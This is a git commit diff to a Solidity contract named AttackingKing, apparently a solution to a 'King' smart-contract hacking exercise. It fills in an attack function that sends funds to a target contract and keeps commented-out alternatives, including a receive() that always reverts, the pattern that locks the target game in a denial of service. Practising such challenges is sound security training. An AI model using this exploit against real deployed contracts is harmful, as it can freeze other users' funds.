9ab18d767db9f4bf443030c2694e2abb28911124
Robin Oh <OhRobin@users.noreply.github.com>
2022-07-02 01:22:18 -0700

    holy shit

--- contracts/5. King/AttackingKing.sol
+++ contracts/5. King/AttackingKing.sol
@@ -10,7 +10,30 @@ contract AttackingKing {
         contractAddress = _contractAddress;
     }
 
+    // Answer 1) Explicit receive or fallback that reverts/fails
+    // receive() external payable {
+    //     revert("nice try"); // assert(false);
+    // }
+
+    // function hackContract() external payable{
+    //     (bool success, ) = contractAddress.call{value: 1 ether}("");
+    // }
+
+    // answer 2) no fallback to send back to 
     function hackContract() external {
-        // Code me!
+        (bool success, ) = contractAddress.call{value: address(this).balance}("");
     }
+
+
+    // answer 3) the payable function is the function i sent and it creates an aribrary rule
+    // function hackContract() external payable{
+    //     require (msg.value < 2 ether);
+    //     (bool success, ) = contractAddress.call{value: 2 ether}("");
+    // }
+
+
+
+
+
+
 }
